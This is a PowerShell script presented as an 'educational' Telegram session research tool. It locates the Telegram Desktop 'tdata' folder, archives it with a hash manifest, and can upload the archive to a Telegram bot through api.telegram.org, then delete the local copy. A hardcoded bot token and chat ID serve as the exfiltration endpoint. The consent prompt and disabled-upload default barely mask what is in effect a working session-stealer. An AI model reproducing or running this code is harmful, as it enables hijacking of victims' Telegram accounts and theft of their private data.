<#
.SYNOPSIS
    Educational framework for analyzing Telegram session data protection.
.DESCRIPTION
    This script demonstrates how a threat actor could collect, compress, and exfiltrate
    the Telegram 'tdata' folder. It is designed for defensive research only.
    All operations are logged, and consent is required before execution.
.NOTES
    Version: 1.0
    Author: DarkForge-X (Educational Mode)
    Tested on: Windows 10/11, PowerShell 5.1+
#>

#region CONFIGURATION
$script:CONFIG = @{
    # Consent flag – must be set to $true to proceed
    ConsentRequired   = $true
    # Enable Telegram upload (only if you provide a bot token)
    EnableUpload      = $false
    BotToken          = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"          # Replace if upload enabled
    ChatId            = "243855738"            # Replace if upload enabled
    # Local output settings
    OutputDir         = "$env:USERPROFILE\Desktop"
    ZipName           = "TDATA_Lab_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    LogFile           = "$env:USERPROFILE\Desktop\TDataLab.log"
    # Internal paths
    TDataPath         = "$env:APPDATA\Telegram Desktop\tdata"
}
#endregion

#region LOGGING
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    Add-Content -Path $script:CONFIG.LogFile -Value $logEntry -ErrorAction SilentlyContinue
    Write-Host $logEntry
}
#endregion

#region CONSENT
function Test-Consent {
    if (-not $script:CONFIG.ConsentRequired) { return $true }
    Clear-Host
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host "  TDataLab – Educational Security Research Framework" -ForegroundColor Yellow
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "This script will:" -ForegroundColor White
    Write-Host "  1. Locate the Telegram session folder (tdata)" -ForegroundColor Gray
    Write-Host "  2. Create a compressed archive of its contents" -ForegroundColor Gray
    Write-Host "  3. Generate a cryptographic hash for integrity check" -ForegroundColor Gray
    if ($script:CONFIG.EnableUpload) {
        Write-Host "  4. Upload the archive to a Telegram bot (ENABLED)" -ForegroundColor Yellow
    } else {
        Write-Host "  4. Save the archive locally (upload DISABLED)" -ForegroundColor Green
    }
    Write-Host ""
    Write-Host "⚠️  By proceeding, you confirm that:" -ForegroundColor Red
    Write-Host "    - You are the owner of this machine" -ForegroundColor Red
    Write-Host "    - This is for educational/defensive research only" -ForegroundColor Red
    Write-Host "    - You will not use this against others" -ForegroundColor Red
    Write-Host ""
    $response = Read-Host "Type 'YES' to continue or any other key to exit"
    if ($response -ne "YES") {
        Write-Log "Consent denied. Exiting." "WARN"
        return $false
    }
    Write-Log "Consent granted." "INFO"
    return $true
}
#endregion

#region CORE LOGIC
function Find-TDataFolder {
    $path = $script:CONFIG.TDataPath
    if (Test-Path $path) {
        Write-Log "TData folder found: $path" "INFO"
        return $path
    }
    Write-Log "TData folder not found. Check Telegram installation." "WARN"
    return $null
}

function Get-FileManifest {
    param([string]$RootPath)
    $files = Get-ChildItem -Path $RootPath -Recurse -File -ErrorAction SilentlyContinue
    $manifest = @()
    foreach ($f in $files) {
        $hash = Get-FileHash -Path $f.FullName -Algorithm SHA256
        $manifest += [PSCustomObject]@{
            Path        = $f.FullName.Replace($RootPath, "")
            Size        = $f.Length
            SHA256      = $hash.Hash
            LastModified = $f.LastWriteTime
        }
    }
    Write-Log "Manifest generated: $($manifest.Count) files" "INFO"
    return $manifest
}

function Compress-TData {
    param([string]$SourcePath, [string]$ZipPath, [array]$Manifest)
    try {
        # Use .NET Compression
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $ZipPath)
        Write-Log "Archive created: $ZipPath" "INFO"
        
        # Append manifest inside the ZIP
        $manifestFile = Join-Path $env:TEMP "manifest.csv"
        $Manifest | Export-Csv -Path $manifestFile -NoTypeInformation
        $zip = [System.IO.Compression.ZipFile]::Open($ZipPath, 'Update')
        $entry = $zip.CreateEntry("manifest.csv")
        $stream = $entry.Open()
        $bytes = [System.IO.File]::ReadAllBytes($manifestFile)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        $zip.Dispose()
        Remove-Item $manifestFile -Force
        Write-Log "Manifest appended to archive." "INFO"
        return $true
    } catch {
        Write-Log "Compression failed: $_" "ERROR"
        return $false
    }
}

function Send-ToTelegram {
    param([string]$FilePath)
    if (-not $script:CONFIG.EnableUpload) {
        Write-Log "Upload disabled. Archive saved locally." "INFO"
        return $true
    }
    if ($script:CONFIG.BotToken -eq "YOUR_BOT_TOKEN" -or $script:CONFIG.ChatId -eq "YOUR_CHAT_ID") {
        Write-Log "Telegram credentials not configured. Skipping upload." "WARN"
        return $false
    }
    try {
        $uri = "https://api.telegram.org/bot$($script:CONFIG.BotToken)/sendDocument"
        $multipart = @{
            chat_id = $script:CONFIG.ChatId
            document = Get-Item -Path $FilePath
        }
        $response = Invoke-RestMethod -Uri $uri -Method Post -Form $multipart
        if ($response.ok) {
            Write-Log "Archive uploaded to Telegram successfully." "INFO"
            return $true
        } else {
            Write-Log "Telegram upload failed: $($response.description)" "ERROR"
            return $false
        }
    } catch {
        Write-Log "Telegram upload exception: $_" "ERROR"
        return $false
    }
}

function Cleanup {
    param([string]$ZipPath)
    if (Test-Path $ZipPath) {
        Remove-Item $ZipPath -Force
        Write-Log "Cleaned up temporary archive." "INFO"
    }
}
#endregion

#region MAIN EXECUTION
function Start-TDataLab {
    Write-Log "=========================================" "INFO"
    Write-Log "TDataLab session started." "INFO"
    Write-Log "=========================================" "INFO"

    # Consent
    if (-not (Test-Consent)) { return }

    # Find tdata
    $tdataPath = Find-TDataFolder
    if (-not $tdataPath) {
        Write-Log "Exiting: TData folder not found." "WARN"
        return
    }

    # Build manifest
    $manifest = Get-FileManifest -RootPath $tdataPath
    if ($manifest.Count -eq 0) {
        Write-Log "No files found in tdata. Exiting." "WARN"
        return
    }

    # Compress
    $zipFullPath = Join-Path $script:CONFIG.OutputDir $script:CONFIG.ZipName
    $compressOk = Compress-TData -SourcePath $tdataPath -ZipPath $zipFullPath -Manifest $manifest
    if (-not $compressOk) {
        Write-Log "Compression failed. Exiting." "ERROR"
        return
    }

    # Upload or save
    if ($script:CONFIG.EnableUpload) {
        $uploadOk = Send-ToTelegram -FilePath $zipFullPath
        if ($uploadOk) {
            Cleanup -ZipPath $zipFullPath
        } else {
            Write-Log "Upload failed; archive retained at: $zipFullPath" "WARN"
        }
    } else {
        Write-Log "Archive saved locally: $zipFullPath" "INFO"
    }

    Write-Log "=========================================" "INFO"
    Write-Log "TDataLab session completed." "INFO"
    Write-Log "=========================================" "INFO"
}
#endregion

#region ENTRY POINT
# Guard against accidental execution
if ($MyInvocation.InvocationName -ne '.') {
    Write-Host "Run this script with: .\TDataLab.ps1" -ForegroundColor Cyan
    Write-Host "Or use: powershell -ExecutionPolicy Bypass -File TDataLab.ps1" -ForegroundColor Gray
}

# Run
Start-TDataLab
#endregion